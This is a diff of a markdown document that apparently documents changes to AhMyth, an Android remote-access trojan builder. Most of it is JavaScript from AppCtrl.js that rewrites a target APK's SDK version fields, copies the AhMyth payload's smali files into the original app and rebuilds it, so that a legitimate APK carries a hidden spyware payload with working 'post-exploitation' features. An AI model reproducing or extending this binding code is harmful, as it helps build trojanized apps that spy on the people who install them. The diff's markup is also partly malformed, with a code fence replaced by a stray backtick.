@@ -8,8 +8,7 @@ mainWindow.setAlwaysOnTop(true, "screen-saver")     // - 2 -
 This code snippet is responsible for automatically changing the `apktool.yml` file's sdk version to `22`
 in order for the post-exoloitation features of the payload to work after after installing a Bound apk payload.
 - AppCtrl.js
-```js
-                              $appCtrl.Log("Determining Target SDK Version...");
+`                              $appCtrl.Log("Determining Target SDK Version...");
                               $appCtrl.Log()
                               fs.readFile(path.join(apkFolder, "AndroidManifest.xml"), 'utf8', (error, data) => {
                                 if (error) {
@@ -19,14 +18,9 @@ in order for the post-exoloitation features of the payload to work after after i
                                 
                                 $appCtrl.Log("Modifying the Target SDK Version...");
                                 $appCtrl.Log();
-
-                                var sdkVerCoRegex = /\b(compileSdkVersionCodename=\s*")\d{1,2}"/;
-                                var verNameRegex = /\b(platformBuildVersionName=\s*")\d{1,2}"/;
-
                                 var compSdkRegex = /\b(compileSdkVersion=\s*")\d{1,2}"/;
-                                var verCoRegex = /\b(platformBuildVersionCode=\s*")\d{1,2}"/;
-				
-                                var repXmlSdk = data.replace(compSdkRegex, "$122"+'"').replace(verCoRegex, "$122"+'"').replace(sdkVerCoRegex, "$111"+'"').replace(verNameRegex, "$111"+'"');
+                                var VerCoRegex = /\b(platformBuildVersionCode=\s*")\d{1,2}"/;
+                                var repXmlSdk = data.replace(compSdkRegex, "$122"+'"').replace(VerCoRegex, "$122"+'"');
                                 fs.writeFile(path.join(apkFolder, "AndroidManifest.xml"), repXmlSdk, 'utf8', (error) => {
                                   if (error) {
                                       $appCtrl.Log('Modifying Manifest Target SDK Failed!', CONSTANTS.logStatus.FAIL);
@@ -43,13 +37,46 @@ in order for the post-exoloitation features of the payload to work after after i
 
                                       var minSdkRegex = /\b(minSdkVersion:\s*')\d{1,2}'/;
                                       var tarSdkRegex = /\b(targetSdkVersion:\s*')\d{1,2}'/;
-                                      var repSdk = data.replace(minSdkRegex, "$119"+'"').replace(tarSdkRegex, "$122"+'"');
-                                      fs.writeFile(path.join(apkFolder, 'apktool.yml'), repSdk, 'utf8', (error) => {
+                                      var repYmlSdk = data.replace(minSdkRegex, "$119'").replace(tarSdkRegex, "$122'");
+                                      fs.writeFile(path.join(apkFolder, 'apktool.yml'), repYmlSdk, 'utf8', (error) => {
                                         if (error) {
                                             $appCtl.Log("Modifying the 'apktool.yml' Target SDK Failed!")
                                             $appCtrl.Log()
                                             return;
                                           }
+
+                                          var regex = /[^/]+\//;
+                                          var str = launcherPath;
+                                          var m = str.replace(/\\/g, "/").match(regex);
+              
+                                          var smaliFolder = m[0];
+              
+                                          $appCtrl.Log("Copying AhMyth Payload Files to Orginal APK...");
+                                          $appCtrl.Log();
+                                          fs.copy(path.join(CONSTANTS.ahmythApkFolderPath, "smali"), path.join(apkFolder, smaliFolder), (error) => {
+                                              if (error) {
+                                                  $appCtrl.Log('Copying Failed!', CONSTANTS.logStatus.FAIL);
+                                                  $appCtrl.Log();
+                                                  return;
+                                                }
+                                                
+                                                $appCtrl.GenerateApk(apkFolder);
+                                
+                                            });
+                                            
+                                        });
+                
+                                    });
+                
+                                });
+
+                            });
+
+                        });
+
+                    });
+
+                });
 ```
 # Function to Empty the Apktool Framework Directory
 This Code will reduce building failed errors with both Standalone APK payloads and Bound APK Payloads, it empties the apktool framework directory before building any payload everytime
